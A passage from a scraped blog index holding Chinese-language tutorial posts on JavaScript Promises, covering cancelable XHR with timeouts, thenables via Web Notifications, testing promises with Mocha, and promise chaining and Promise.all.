TimeoutError('timeout');&#125;);promise.catch(function(error)&#123; console.log(error instanceOf TimeoutError); // true&#125;); 通过超时取消XHR操作取消XHR操作可以调用XMLHttpRequest对象的abort方法实现，为了能在外部调用abort方法，可以对getUrl进行扩展，cancelalbeXHR返回一个包装XHR的promise对象，这个对象还有一个abort方法取消XHR请求。12345678910111213141516171819202122232425262728293031function cancelableXHR(url)&#123; var req = new XMLHttpRequest(); var promise = new Promise(function(resolve, reject)&#123; req.open('GET', url, true); req.onload = function()&#123; if(req.status === 200)&#123; resolve(req.responseText); &#125;else&#123; reject(new Error(req.statusText)); &#125; &#125;; req.onerror = function()&#123; reject(new Error(req.statusText)); &#125;; req.onabort = function()&#123; reject(new Error('abort this request')); &#125;; req.send(); &#125;); var abort = function()&#123; // 若request还没结束则执行abort if(req.readyState !== XMLHttpRequest.UNSENT)&#123; req.abort(); &#125; &#125;; return &#123; promise: promise, abort: abort &#125;;&#125; 有了cancelableXHR之后，基于它编写普通的Promise处理流程即可： 通过cancelableXHR方法取得包装XHR的promise对象，和取消该XHR请求的abort方法。 在timeoutPromise方法中通过Promise.race让XHR保证的promise和超时promise进行竞争。 XHR在超时前返回结果的话，则和正常promise一样，通过then返回请求结果 若超时则抛出throw TimeoutError异常并且被catch捕获 catch捕获的异常若是TimeoutError的话，则调用abort方法取消XHR请求1234567891011121314// 执行var object = cancelableXHR('http://httpbin.org/get');timeoutPromise(object.promise, 1000).then(function (contents) &#123; console.log('Contents', contents);&#125;).catch(function (error) &#123; if (error instanceof TimeoutError) &#123; object.abort(); return console.log(error); &#125; console.log('XHR Error :', error);&#125;);// 输出：// Contents,&#123; \"args\": &#123;&#125;, \"headers\": &#123; \"Accept\": \"*/*\", \"Accept-Encoding\": \"gzip, deflate, sdch\", \"Accept-Language\": \"en-US,en;q=0.8\", \"Connection\": \"close\", \"Host\": \"httpbin.org\", \"Origin\": \"http://liubin.org\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36\" &#125;, \"origin\": \"122.193.105.218\", \"url\": \"http://httpbin.org/get\" &#125; 在上述的cancelableXHR中，promise对象及其操作方法都是在一个对象中返回的，这样做的好处是，不用将所有的操作都放在一个函数中完成，一个函数只返回一个值（可以是对象），对象中可以包含多个方法，每个方法完成不同的工作，减少单个方法的复杂度，同时方便扩展，阅读和维护。 将这些处理封装为一个模块（AMD，CommonJS，ES6 module …），比如：将cancelableXHR封装为一个Nodejs模块：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051'use strict';var requestMap = &#123;&#125;;function createXHRPromise(url)&#123; var req = new XMLHttpRequest(); var promise = new Promise(function(resolve, reject)&#123; req.open('GET',url,true); req.onreadystatechange = function()&#123; if(req.readyState === XMLHttpRequest.DONE)&#123; delete requestMap[url]; &#125; &#125;; req.onload = function()&#123; if(req.state === 2000)&#123; resolve(req.responseText); &#125;else&#123; reject(new Error(req.statusText)); &#125; &#125;; req.onerror = function()&#123; reject(new Error(req.statusText)); &#125;; req.onabort = function()&#123; reject(new Error('abort this req')); &#125;; req.send(); &#125;); requestMap[url] = &#123; promise: promise, request: req &#125;; return promise;&#125;function abortPromise(promsie)&#123; if(typeof promise === 'undefined')&#123; return; &#125; var request; Object.keys(requestMap).some(function(url)&#123; if(requestMap[url].promise === promise)&#123; request = requestMap[url].request; return true; &#125; &#125;); if(request != null &amp;&amp; request.readyState !== XMLHttpRequest.UNSENT)&#123; request.abort(); &#125;&#125;module.exprots.createXHRPromise = createXHRPromise;module.exprots.abortPromise = abortPromise; 测试模块：创建包装XHR的promise对象，取消prmise对象的请求123456var cancelableXHR = require('./cancelableXHR');var xhrPromise = cancelableXHR.createXHRPromise('http://httpbin.org/get');xhrPromise.catch(function (error) &#123; // 调用 abort 抛出的错误&#125;);cancelableXHR.abortPromise(xhrPromise); Promise.prototype.done方法链基于Promise顺序处理","categories":[{"name":"promise","slug":"promise","permalink":"https://github.com/xmoyKING/categories/promise/"}],"tags":[{"name":"promise","slug":"promise","permalink":"https://github.com/xmoyKING/tags/promise/"},{"name":"deferred","slug":"deferred","permalink":"https://github.com/xmoyKING/tags/deferred/"}]},{"title":"Promise4-高级进阶(resolve,reject)","slug":"promise4","date":"2017-04-13T14:54:03.000Z","updated":"2017-12-06T14:50:09.415Z","comments":true,"path":"2017/04/13/promise4/","link":"","permalink":"https://github.com/xmoyKING/2017/04/13/promise4/","excerpt":"","text":"基于前面学过的一些Promise知识，深入了解Promise里的一些内容，加深理解。 Promise.resolve 和 ThenablePromise.resolve最大的一个特性就是可以将thenable对象转换为promise对象，这一节就具体了解这个转换过程 以桌面通知Web Notifications API为例，它能通过浏览器在桌面显示通知消息， 关于Web Notifications 可以参考使用 Web Notifications - WebAPI | MDN12345678// 由于Web Notification涉及到桌面通知，所以选哟先获取权限// 通过如下语句可以发起请求，向用户请求权限，Notification.requestPermission(function(status)&#123; console.log(status); //分别有：默认询问default，允许granted，拒绝denied&#125;);// 在已经获得权限的情况下，在浏览器运行如下语句能在桌面弹出提示new Notification('Hi!'); Notification的granted和denied与Promise的resolve和reject很相似。 先用回调函数的方式对WN(仅仅是本文对Web Notification的简称)包装函数进行重写：12345678910111213141516171819202122232425262728293031function notifyMsg(msg, opts, cb)&#123; if(Notification &amp;&amp; Notification.permission === 'granted')&#123; // 若已经获取到权限 var notification = new Notification(msg, opts); cb(null, notification); &#125;else if(Notification.requestPermission)&#123; Notification.requestPermission(function(status)&#123; if(Notification.permission !== status)&#123; Notification.permission = status; &#125; if(status === 'granted')&#123; var notification = new Notification(msg, opts); cb(null, notification); &#125;else&#123; cb(new Error('user denied')); &#125; &#125;); &#125;else&#123; cb(new Error('do not support WN')); &#125;&#125;// 执行,第二个参数是opts对象notifyMsg('Hi', &#123;&#125;, function(error,notification)&#123; if(error)&#123; return console.log(error); // 失败时，打印错误：Error: user denied &#125; console.log(notification); // 成功获得权限则打印notification对象&#125;); 上述代码，一旦用户选择第一次拒绝或同意之后就不会再弹出请求弹窗了，而是直接在控制台输出信息。 若要将上述代码转变为promise风格,可以加上如下代码：1234567891011121314151617function notifyMsgPromise(msg, opts)&#123; return new Promise(function(resolve, reject)&#123; notifyMsg(msg, opts, function(error, notification)&#123; if(error)&#123; reject(error); &#125;else&#123; resolve(notification); &#125; &#125;); &#125;);&#125;// 执行notifyMsgPromise('Hi').then(function(notification)&#123; console.log(notification);&#125;).catch(function(error)&#123; console.error(error);&#125;) 上述代码，当用户同意时，then函数会被调用，然后显示Hi信息在桌面，当用户拒绝时，catch会被调用。 注意：由于浏览器是以网站为单位保存WN的许可状态的，而状态有四种，分别为： 已经获得用户许可, then方法会被调用 弹出对话框并获得许可，then方法会被调用 已经被童虎拒绝，catch方法会被调用 弹出对话框并被拒绝，catch方法会被调用即：当使用原生的WN时，需要对上述四种程序进行处理，可以将四种情况包装简化为两种处理方式。 WN包装函数wrapperPS:貌似同前面没什么差别，暂时没记录 Thenablethenable就是一个具有then方法的对象，下面在回调函数风格的代码中增加一个返回值为thenable类型的方法，具体如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344function notifyMsg(msg, opts, cb)&#123; if(Notification &amp;&amp; Notification.permission === 'granted')&#123; var notification = new Notification(msg, opts); cb(null, notification); &#125;else if(Notification.requestPermission)&#123; Notification.requestPermission(function(status)&#123; if(Notification.permission !== status)&#123; Notification.permission = status; &#125; if(status === 'granted')&#123; var notification = new Notification(msg, opts); cb(null, notification); &#125;else&#123; cb(new Error('user denied')); &#125; &#125;); &#125;else&#123; cb(new Error('do not support Notification')); &#125;&#125;// 返回thenablefunction notifyMsgThenable(msg, opts)&#123; return &#123; 'then': function(resolve, reject)&#123; notifyMsg(msg, opts, function(error, notification)&#123; if(error)&#123; reject(error); &#125;else&#123; resolve(notification); &#125; &#125;); &#125; &#125;;&#125;// 执行Promise.resolve(notifyMsgThenable('message')).then(function(notification)&#123; console.log(notification);&#125;).catch(function(error)&#123; console.error(error);&#125;); 上述代码中的notifyMsgThenable方法返回的对象有then方法，then方法的参数和new Promise(function(resolve, reject){})一样，在确定时调用resolve，拒绝时调用reject。 notifyMsgThenable和notifyMsgPromise一样，Promise.resolve(thenable)都能调用，这里的thenable是一个promise对象。 这种Thenable对象的封装表现为回调和Promise风格之间，即：Callback - Thenable - Promise. 这种Thenable最大的用处可能是能将一个对象在不同的Promise类库（基于Promise标准，但实现不同，可能有一些独特的方法和限制）之间进行转换。 比如类库Q的Promise实例为Q Promise，就提供了ES6 Promises的实例对象不具备的方法，如：promise.finally(cb) 和 promise.nodeify(cb)。 1234567891011121314// 将ES6 Promise转换为Q Promisevar Q = require('Q');// ES6中的promise对象var promise = new Promise(function(resolve)&#123; resolve(1);&#125;);// 转换为Q promise对象Q(promise).then(function(value)&#123; console.log(value);&#125;).finally(function()&#123; console.log('finally');&#125;); 上述代码中promise对象在创建时具备then方法， 因此可以通过Q(thenable)将这个对象转换为Q Promise对象。 使用reject而不是throwPromise的构造函数，以及被then调用执行的函数可以认为是在try catch中执行的，所以这些代码中即使执行了throw语句，也不会导致程序异常终止。若在Promise中使用throw语句，会被catch捕获，同时promise对象变为Rejected状态1234567var promise = new Promise(function(resolve, reject)&#123; throw new Error('message');&#125;);promise.catch(function(error)&#123; console.error(error); // 'message'&#125;); 上述代码运行不会出问题，但是在更改promise对象状态的时候，使用reject方法更合理更清晰。1234567var promise = new Promise(function(resolve, reject)&#123; reject('message');&#125;);promise.catch(function(error)&#123; console.error(error); // 'message'&#125;); 使用reject还有一个好处：throw语句无法区分是否是我们主动抛出的还是其他的非预期的异常导致的，而reject可以确定是我们主动调用的。 当在then中进行reject，想要像下面那样在then中进行reject？12345678910var promise = Promise.resolve();promise.then(function(value)&#123; setTimeout(function()&#123; //... 一段时间后若还没处理完则进行reject &#125;, 1000); // 一些耗时任务 somethingHardwork();&#125;).catch(function(error)&#123; // 捕获超时错误&#125;); 上述代码需要在then中reject调用，但是传递给当前的回调函数的参数只有前面的一个promise对象，该怎么办？此处需要利用then中的return功能，返回值不仅仅是简单的字面量，还可以是复杂的对象类型，这个返回的值能传给后面的then或catch。同时若返回一个promise对象，则可以根据这个promise对象状态，在下一个then中指定回调函数的onFulfilled和onRjected的哪一个调用是确定的。1234567var promise = Promise.resolve();promise.then(function()&#123; var retPromise = new Promise(function(resolve, reject)&#123; // resolve和reject的状态是onFulfilled或onRejected &#125;); return retPromise;&#125;).then(onFulfilled, onRejected); 上述代码，then的待用函数promise对象的状态来决定的。 也就是说，这个retPromise对象状态为Rejected，会调用后面then的onRejeected方法。12345678910111213var onRejected = console.error.bind(console);var promise = Promise.resolve();promise.then(function()&#123; var retPromis = new Promise(function(resolve, reject)&#123; reject(new Error('this promise is rejected')); &#125;);&#125;).catch(onRejected);// 下面代码是对上面代码的简化var onRejected = console.error.bind(console);var promise = Promise resolve();promise.then(function()&#123; return Promise.reject(new Error('this promise is rejected'));&#125;).catch(onRejected);","categories":[{"name":"promise","slug":"promise","permalink":"https://github.com/xmoyKING/categories/promise/"}],"tags":[{"name":"promise","slug":"promise","permalink":"https://github.com/xmoyKING/tags/promise/"},{"name":"web notifications","slug":"web-notifications","permalink":"https://github.com/xmoyKING/tags/web-notifications/"}]},{"title":"Promise3-测试","slug":"promise3","date":"2017-04-11T09:20:43.000Z","updated":"2017-04-21T09:20:43.000Z","comments":true,"path":"2017/04/11/promise3/","link":"","permalink":"https://github.com/xmoyKING/2017/04/11/promise3/","excerpt":"","text":"上一篇学习了如何编写Promise，这篇学习如何对Promise进行测试，使用Mocha对Promise进行基本测试 MochaMocha 是基于Nodejs的一个测试框架, 先学一些基本的用法，具体的流程如下：12# 安装mochanpm install mocha -g 然后使用Nodejs默认自带的assert模块，Mocha中的it指定done参数，在done函数被执行之前，该测试一直处于等待状态，这样就可以对异步进行测试。123456789101112131415161718192021222324// basic.jsvar assert = require('assert');describe('basic test', function()&#123; // 对一个回调风格的异步函数进行测试， context('When Callback(high-order function)', function()&#123; it('should use `done` for test', function(done)&#123; // 1.回调函数的异步处理 setTimeout(function()&#123; assert(true); done(); // 2.调用done后测试结束 &#125;,0); &#125;); &#125;); // 对Promise进行测试 context('When promise object', function()&#123; it('should use `done` for test?', function(done)&#123; var promise = Promise.resolve(1); // 1. 创建一个promise对象，状态为Fulfilled promise.then(function(value)&#123; assert(value === 1); done(); // 2.调用done后测试结束 &#125;); &#125;); &#125;);&#125;); 使用mocha ./basic.js执行： 测试失败时的示例12345678910111213141516171819202122232425var assert = require('assert');describe('basic test', function()&#123; context('When Promise Timeout', function()&#123; // 以下测试不会结束，直到超时 it(\"should use `done` for test?\", function (done) &#123; var promise = Promise.resolve(); promise.then(function (value) &#123; assert(false);// =&gt; throw AssertionError done(); &#125;); &#125;); &#125;); // 下段与上段代码不可同时执行 context('When Promise error', function()&#123; // 正常失败的测试 it(\"should use `done` for test?\", function (done) &#123; var promise = Promise.resolve(); promise.then(function (value) &#123; assert(false);// =&gt; throw AssertionError &#125;).then(done,done); // 由于后面接了一个then(done,done), assert 通过会调用done，失败也会调用done(error); &#125;); &#125;);&#125;); 超时失败: 正常失败: Mocha &amp; Promise对Promise进行测试的时候，不使用done，而是返回一个promise对象,具体示例如下：123456789101112131415var assert = require('assert');describe('Promise Test',function()&#123; it('should return a promise object', function()&#123; var promise = Promise.resolve(1); return promise.then(function(value)&#123; assert(value === 1); // 测试成功 &#125;); &#125;); it('should be fail', function()&#123; return Promise.resolve().then(function()&#123; assert(false); // 测试失败 &#125;); &#125;);&#125;); 采用这种方式，当assert失败的时候，测试也就是失败了，能从根本上省略如then(done, done)这样与测试逻辑无直接关系的代码。 但是上述的失败是预定的，若发生了非预定的失败的时候，还是按照Mocha的写法来测试就会有问题。12345678910// 对Error Object进行测试function mayRejected()&#123; return Promise.reject(new Error('woo'));&#125;it('is bad pattern', function()&#123; return mayRejected().catch(function(error)&#123; assert(error.message === 'woo'); &#125;);&#125;); 当上面测试代码中的promise对象变为Rejected的时候，会调用onRejceted中注册的函数，也就是function(error){assert(error.message === &#39;woo&#39;);}, 从而测试成功。 但是若mayRejected中的代码不是reject而是resolve时，测试会一直成功，因为promise会返回一个Fulfill状态，而catch中注册的onRejected函数并不会被调用，所以测试会一直通过，显示passed。12345678910// 对Error Object进行测试function mayRejected()&#123; return Promise.resolve();&#125;it('is bad pattern', function()&#123; return mayRejected().catch(function(error)&#123; assert(error.message === 'woo'); &#125;);&#125;); 为了解决这个问题，我们可以在catch前加入一个then调用，可以理解为若成功调用了then，那么测试就失败了。1234567891011function failTest()&#123; throw new Error('Expected promise to be rejected but it was fulfilled');&#125;function mayRejected()&#123; return Promise.resolve();&#125;it('should bad pattern', function()&#123; return mayRjected().then(failTest).catch(function(error)&#123; assert.deepEqual(error.message === 'woo'); &#125;);&#125;); 但是上述代码也有一个问题，若failTest本身出错了呢？ 它抛出的异常会被catch捕捉，同时传递给catch的Error对象是AssertionError类型。 所以此时，需要在测试代码中明确指定Fulfilled和Rejected两种状态下的处理流程，这样的话，就能在promise变为Fulfilled状态的时候编写失败的测试代码了。12345678function mayRejected()&#123; return Promise.resolve();&#125;it('catch -&gt; then', function()&#123; return mayRejected().then(failTest, function(err)&#123; assert(error.message === 'woo'); &#125;);&#125;); 前面说过，推荐then - catch的方式编写promise，而不是then(onFulfilled, onRejected), 因为Promise提供了强大的错误处理机制，但是在测试环境下，Promise的错误机制反而限制了测试失败的代码，所以不得不使用then的写法，这样才能明确promise在各种状态下进行何种处理。 总结： 在普通的使用情况中，采用then - catch的流程比较容易理解，在处理错误的时候能带来很多方便 在测试时，将测试代码集中到then中处理，能将AssertionError对象传递到测试框架中 可控测试（controllable tests）什么是可控测试？ 对一个待测的Promise对象，若能实现如下2点，则称为可控测试， 若编写预期为Fulfilled状态的测试的话， Rejected的时候要Fail assertion的结果不一致的时候要Fail 若预期为Rejected状态的话 结果为Fulfilled测试为Fail assertion的结果不一致的时候要Fail也就是说，一个测试用例应该包含下面的测试内容， 结果满足Fulfilled / Rejected之一 对传递给assertion的值进行检查 比如，如下的then代码就是一个期望结果为Rejected的测试1234promise.then(failTest, function(error)&#123; // 通过assertion验证error对象 assert(error instanceof Error);&#125;); 由于在编写测试代码时，需要明确指定promise状态为Fulfilled或Rejected之一，而then在调用的时候可以省略参数，有时可能忘记加入使测试失败的条件，此时，可以定义一个helper函数，用来设置promise为期望的状态, 关于helper函数，可以查看azu/promise-test-helper123456789101112131415161718192021222324var assert = require('assert');describe('Promise Test',function()&#123; // 一个名为shouldRejected的helper函数 function shouldRejected(promise)&#123; return &#123; 'catch': function(fn)&#123; return promise.then(function()&#123; throw new Error('Expected promise to be reject but it was fulfilled'); &#125;, function(reason)&#123; fn.call(promise, reason); &#125;); &#125; &#125;; &#125; it('should be rejected', function()&#123; var promise = Promise.reject(new Error('human error')); return shouldRejected(promise).catch(function(error)&#123; assert(error.message === 'human error'); &#125;); &#125;);&#125;); 上述代码中，shouldRejected函数接收一个promise对象作为参数，并且返回一个带有catch方法的对象，在这个catch中可以使用和onRejected里一样的代码，因此可以在catch使用基于assertion方法的测试代码。 在shouldRejected外部，是和普通promise处理相同流程的代码： 将需要测试promise对象传递给shouldRejected方法 在返回的对象里catch方法中编写进行onRejected处理的代码 在onRejected里使用assertion进行判断 在使用shouldRejected函数的时候，若Fulfilled被调用了的话，则会throw一个异常，测试会显示失败。类似的，可以编写一个shouldFulfilled的helper函数, 结构类似。123456789101112131415161718192021222324var assert = require('assert');describe('Promise Test',function()&#123; // 一个名为shouldFulfilled的helper函数 function shouldFulfilled(promise)&#123; return &#123; 'then': function(fn)&#123; return promise.then(function(value)&#123; fn.call(promise, value); &#125;, function(reason)&#123; throw new Error(reason); &#125;); &#125; &#125;; &#125; it('should be resolve', function()&#123; var promise = Promise.resolve('value'); return shouldFulfilled(promise).then(function(value)&#123; assert(value === 'value'); &#125;); &#125;);&#125;);","categories":[{"name":"promise","slug":"promise","permalink":"https://github.com/xmoyKING/categories/promise/"}],"tags":[{"name":"promise","slug":"promise","permalink":"https://github.com/xmoyKING/tags/promise/"},{"name":"mocha","slug":"mocha","permalink":"https://github.com/xmoyKING/tags/mocha/"}]},{"title":"Promise2-实践练习","slug":"promise2","date":"2017-04-10T09:27:46.000Z","updated":"2017-04-20T09:27:46.000Z","comments":true,"path":"2017/04/10/promise2/","link":"","permalink":"https://github.com/xmoyKING/2017/04/10/promise2/","excerpt":"","text":"本次学习Promise提供的各种方法以及错误处理 快捷方式Promise对象提供了许多静态方法，比如Promise.resolve(value)可以看作是new Promise()的快捷方式。12345Promise.resolve(42);// 上行的作用同下面的代码一样，可以看作是下面方法的快捷方式，或语法糖new Promise(function(resolve, reject)&#123; resolve(42);&#125;) Promise.resolve(value)的返回值就是一个Promise对象，所以可以直接链式操作，进行then调用123Promise.resolve(42).then(function(value)&#123; console.log(value); // 42&#125;); Promise.resolve()的另外一个作用是将一个thenable对象（简单的说，即具有.then方法的对象）转换为Promise对象（有点像将具有.length属性的对象成为Array like对象一样），这里的then方法应该与Promise对象所有的then方法具有一样的功能和处理流程。 然后就能直接使用then或catch等ES6 Promise中定义的方法了。 比如jQuery.ajax(),它的返回值就是thenable的对象，但是毕竟不是原生的Promise生成的对象，所以转换后的promise会出现一些问题，1234var promise = Promise.resolve($.ajax('file.json')); // 返回一个promise对象promise.then(function(value)&#123; console.log(value);&#125;); 所以，Promise.resolve方法的作用就是将传递给它的参数填充到一个promise对象，然后返回这个promise对象。 可以类比到Promise.reject()，不同的是Promise.reject()静态方法调用的是reject，而不是resolve。123Promise.reject(new Error('BOOM！')).catch(function(error)&#123; console.error(error); // Error: BOOM!&#125;); 在使用then的过程中，可能认为then指定的方法是同步的，而实际上是异步的。12345678910111213var promise = new Promise(function(resolve)&#123; console.log('inner promise'); // 1 resolve(42);&#125;);promise.then(function(value)&#123; console.log(value); // 3&#125;);console.log('outer promise'); // 2// 输出:// inner promise// outer promise// 42 同步、异步调用可能存在的问题根据Effective JS 67条，不要对异步回调函数进行同步调用。 绝对不能对异步回调函数（即使在数据已经就绪）进行同步调用。 如果对异步回调函数进行同步调用的话，处理顺序可能会与预期不符，可能带来意料之外的后果。 对异步回调函数进行同步调用，还可能导致栈溢出或异常处理错乱等问题。 如果想在将来某时刻调用异步回调函数的话，可以使用 setTimeout 等异步API。 比如一个onReady()函数，会根据具体的情况，选择以同步还是异步的方式对回调函数进行调用。1234567891011121314151617function onReady(fn)&#123; var readyState = document.readyState; if(readyState === 'interactive' || readyState === 'complete')&#123; fn(); // 同步调用 &#125;else&#123; window.addEventListener('DOMContentLoaded', fn); // 异步调用 &#125;&#125;onReady(function()&#123; console.log('DOM fully loaded and parsed');&#125;);console.log('==Starting==');// 输出（不用情况会输出不同顺序）：// DOM fully loaded and parsed// ==Starting== 以上代码就会在某些情况下出现问题，解决的方式就是使用setTimeout或promise123456789101112131415161718192021222324252627282930313233343536// setTimeout的方式 --------------------------------------function onReady(fn)&#123; var readyState = document.readyState; if(readyState === 'interactive' || readyState === 'complete')&#123; setTimeout(fn, 0); // 异步调用 &#125;else&#123; window.addEventListener('DOMContentLoaded', fn); // 异步调用 &#125;&#125;onReady(function()&#123; console.log('DOM fully loaded and parsed');&#125;);console.log('==Starting==');// Promise的方式 --------------------------------------function onReadyPromise()&#123; return new Promise(function(resolve, reject)&#123; var readyState = document.readyState; if(readyState === 'interactive' || readyState === 'complete')&#123; resolve(); &#125;else&#123; window.addEventListener('DOMContentLoaded', resolve); // 异步调用 &#125; &#125;);&#125;onReadyPromise().then(function()&#123; console.log('DOM fully loaded and parsed');&#125;);console.log('==Starting==');// 输出：// ==Starting==// DOM fully loaded and parsed 方法链 promise chain由于then方法返回一个promsie对象，所以可以使用链式调用1234567aPromise.then(function taskA(value)&#123; // task A&#125;).then(function taskB(vaue)&#123; // task B&#125;).catch(function onRejected(error)&#123; console.log(error);&#125;); 上面是一个很简短的方法链的then - catch的例子，若方法链很长，而且没一个promise对象中都注册了onFulfilled和onRejected，这时执行流程将会如何呢？1234567891011121314151617181920212223function TA()&#123; console.log('task A');&#125;function TB()&#123; console.log('task B');&#125;function onRejected(err)&#123; console.log('catch Error: A or B', err);&#125;function finalTask()&#123; console.log('final task');&#125;var promise = Promise.resolve();promise.then(TA) .then(TB) .catch(onRejected) .then(finalTask);// 正常运行结果如下：// task A// task B// final Task 上述流程中，没有在then中指定onRjected参数，也就是说，若TA，TB出现错误将会被catch捕捉，然后接着执行finalTask，而且无论如何都会执行finalTask.即：若TA出现异常，会按照TA - onRjected - finalTask 流程处理，会跳过TB，直接执行onRejected若TB出现异常，会按照TA - TB - onRjected - finalTask 方法链中传递参数若上一个任务想给下一个任务（或后面的任务）传递参数时，可以使用return返回值。123456789101112131415161718192021222324function TA(value)&#123; console.log('task A'); return value + 1;&#125;function TB(value)&#123; console.log('task B'); return value * 2;&#125;function onRejected(err)&#123; console.log('catch Error: A or B', err);&#125;function finalTask(value)&#123; console.log('final task, value:' + value);&#125;var promise = Promise.resolve(1); // 将1传入方法链中promise.then(TA) // 输出log，然后将2返回，传入后续方法 .then(TB) // 输出log，将4返回，传入后续方法 .then(finalTask) // 输出log和value值 .catch(onRejected); // 捕获错误// 输出：// task A// task B// final task, value:4 在每次方法或任务中return的值可以是任意的类型，return的值将会被Promise.resolve(value);进行包装，因此无论返回的什么样的值，then都会返回一个promise对象，后面也只会接手到一个promise对象。 注意：Promise.catch()仅仅只是promise.then(undefined, onRjected);的一个别名而已，算是一个语法糖，所以，这个方法实际上是指定当promise对象状态变为Rejected时的回调函数的。在ES中，catch是保留字，所以报 identifier not found 的语法错误时，可以考虑使用中括号的方式调用：Promise[&#39;catch&#39;]() 若每次then都是创建新的promise对象，则多次使用同一个promise对象的then方法和链式调用同一个函数的差别就能看出来：12345678910111213141516171819202122232425// 多次使用同一个promise对象的then方法var aPromise = new Promise(function(resolve)&#123; resolve(100);&#125;);aPromise.then(function(value)&#123; return value * 2;&#125;);aPromise.then(function(value)&#123; return value * 2;&#125;);aPromise.then(function(value)&#123; console.log('value a :', value); // value a : 100&#125;);// 链式调用同一个函数var bPromise = new Promise(function(resolve)&#123; resolve(100);&#125;);bPromise.then(function(value)&#123; return value * 2;&#125;).then(function(value)&#123; return value * 2;&#125;).then(function(value)&#123; console.log('value b :', value); // value b : 400&#125;); 上述a中情况是，由于没有使用链式调用，then的调用几乎是同时开始执行，而传给每个then方法的value值都是100，所以最后输出的是100。 b的情况是，由于链式调用，多个then方法串在一起，会严格按照resolve - then - then - then 的顺序执行，并且传给每个then方法的value值都是前一个promise对象通过return返回的值。 实际上，不仅仅是then会返回一个promise对象，catch也是如此，两者都返回新的promise对象：123456789101112var aPromise = new Promise(function(resolve)&#123; resolve(100);&#125;);var thenPromise = aPromise.then(function(value)&#123; console.log(value);&#125;);var catchPromise = thenPromise.catch(funtion(err)&#123; console.error(err);&#125;);console.log(aPromise !== thenPromise); // trueconsole.log(catchPromise !== thenPromise); // true 同时，then的错误用法很容易出现一些问题123456789101112131415161718// 错误用法function badAsyncCall()&#123; var promise = Promise.resolve(); promise.then(function()&#123; // 处理... return newval; &#125;); return promise;&#125;// 正确用法，直接返回then函数调用function rightAsyncCall()&#123; var promise = Promise.resolve(); return promise.then(function()&#123; // 处理... return newval; &#125;);&#125; 错误用法的问题： promise.then中产生的异常无法被外界捕捉 无法得到then的返回值，return语句没有起作用 Promise和数组常常有这样的需求：需要一个函数在多个异步都完成之后再进行调用，使用原生普通的XHR回调函数为例：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162function getURLCallback(URL, callback) &#123; var req = new XMLHttpRequest(); req.open('GET', URL, true); req.onload = function () &#123; if (req.status === 200) &#123; callback(null, req.responseText); &#125; else &#123; callback(new Error(req.statusText), req.response); &#125; &#125;; req.onerror = function () &#123; callback(new Error(req.statusText)); &#125;; req.send();&#125;// &lt;1&gt; 对JSON数据进行安全的解析，捕捉可能出现的错误function jsonParse(callback, error, value) &#123; if (error) &#123; callback(error, value); &#125; else &#123; try &#123; var result = JSON.parse(value); callback(null, result); &#125; catch (e) &#123; callback(e, value); &#125; &#125;&#125;// &lt;2&gt; 发送XHR请求var request = &#123; comment: function getComment(callback) &#123; return getURLCallback('http://azu.github.io/promises-book/json/comment.json', jsonParse.bind(null, callback)); &#125;, people: function getPeople(callback) &#123; return getURLCallback('http://azu.github.io/promises-book/json/people.json', jsonParse.bind(null, callback)); &#125; &#125;;// &lt;3&gt; 启动多个XHR请求，当所有请求返回时调用callbackfunction allRequest(requests, callback, results) &#123; if (requests.length === 0) &#123; return callback(null, results); &#125; var req = requests.shift(); req(function (error, value) &#123; if (error) &#123; callback(error, value); &#125; else &#123; results.push(value); allRequest(requests, callback, results); &#125; &#125;);&#125;function main(callback) &#123; allRequest([request.comment, request.people], callback, []);&#125;// 运行的例子main(function(error, results)&#123; if(error)&#123; return console.error(error); &#125; console.log(results);&#125;); 上述回调函数的需要注意的点如下： 直接使用JSON.parse函数可能会抛出出错（JSON对格式检查非常严格，有任何不匹配都会报错），所以这里使用一个try catch的函数包装一下，捕捉有可能出现的错误。 将多个回调进行嵌套处理层次会比较深，所以采用数组的形式进行依次调用 回调函数采用callback(err，val)的形式，第一个表示错误信息，第二个为返回值 在用到jsonParse函数的时候，使用了bind函数绑定，通过这种方式减少匿名函数使用12345jsonParse.bind(null, callback);// 与如下语句作用相当function bindJSONParse(err, val)&#123; jsonParse(callback, err, val);&#125; 问题如下： 需要显示的进行异常处理，每一个回调都需要 为了让嵌套不深，需要一个对request进行处理的函数 回调函数非常多 返回结果截图： 上述代码用promise改造后代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344function getURL(url)&#123; return new Promise(function(resolve,reject)&#123; var req = new XMLHttpRequest(); req.open('GET', url, true); req.onload = function()&#123; if(req.status === 200)&#123; resolve(req.responseText); &#125;else&#123; reject(new Error(req.statusText)); &#125; &#125;; req.onerror = function()&#123; reject(new Error(req.statusText)); &#125;; req.send(); &#125;);&#125;var request = &#123; comment: function getComment()&#123; return getURL('http://azu.github.io/promises-book/json/comment.json').then(JSON.parse); &#125;, people: function getPeople()&#123; return getURL('http://azu.github.io/promises-book/json/comment.json').then(JSON.parse); &#125;&#125;;function main()&#123; function recordValue(results, value)&#123; results.push(value); return results; &#125; // [] 用来保存初始化值 var pushValue = recordValue.bind(null, []); return request.comment().then(pushValue).then(request.people).then(pushValue);&#125;// 执行main().then(function(value)&#123; console.log(value);&#125;).catch(function(error)&#123; console.log(error);&#125;); 和回调函数风格相比，promise可以直接使用JSON.parse函数，main函数返回promise对象，错误处理的地方直接对返回的promise对象处理。 Promise.all()这种需要对多个异步调用都进行统一处理的场景，Promise.all(), Promise.race()可以更方便处理。Promise.all()接收一个promise对象的数组作为参数，当这个数组里的所有promise对象全部变为resolve或reject状态的时候，才会去调用then方法。向Promise.all()传递一个封装了XHR请求的promise数组，则在所有XHR请求都Fulfilled或Rejected状态之后，才调用then方法。123function main()&#123; return Promise.all([request.comment(), request.people()]);&#125; main中的处理流程变得非常清晰，comment和people同时开始执行，而且执行结果同定义在数组中的顺序一致。12345main().then(function(value)&#123; console.log(value); // 按照[comment, people]的顺序接收&#125;).catch(function(error)&#123; console.log(error);&#125;); 使用一个计时器程序，可以测试Promise.all()中的参数数组里的promise是同时开始执行的1234567891011121314151617181920// delay 毫秒后执行resolvefunction timerPromisefy(delay)&#123; return new Promise(function(resolve)&#123; setTimeout(function()&#123; resolve(delay); &#125;,delay); &#125;);&#125;var startDate = Date.now();// 所有的promise变为resolve后程序退出Promise.all([ timerPromisefy(1), timerPromisefy(32), timerPromisefy(64), 